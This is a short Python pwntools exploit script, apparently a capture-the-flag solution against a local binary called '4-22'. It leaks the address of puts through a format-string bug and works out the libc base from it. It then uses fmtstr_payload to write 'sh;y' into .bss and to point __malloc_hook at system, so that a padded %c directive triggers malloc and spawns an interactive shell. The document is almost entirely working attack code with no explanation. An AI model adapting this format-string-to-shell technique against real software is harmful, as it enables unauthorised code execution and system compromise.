from pwn import *
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
#context.log_level='debug'
p=process("./4-22")
offset=7
sleep(3);
print p.recv()
puts_got=134520796
p.sendline(str(puts_got))
data=p.recv()

data=int(data[:10],16)
log.info("puts_adress:%s",hex(data));
libc.address=data-libc.symbols['puts']
log.info("hook:%s",hex(libc.symbols['__malloc_hook']));
log.info("system_adress:%s",hex(libc.symbols['system']));
log.info("malloc_adress:%s",hex(libc.symbols['malloc']));
sh="sh;y"
bss=0x0804a000+0xcc
B=u32(sh);
payload=fmtstr_payload(offset, {bss:B,libc.symbols['__malloc_hook']:libc.symbols['system']})
lenth=len(payload)
print lenth
if False:
	gdb.attach(p,'''
	b *0x804881b
	continue
	''')

p.sendline(payload+"0xdeadbeef"+"%{}c".format(bss-0x20))
p.clean()
p.interactive();
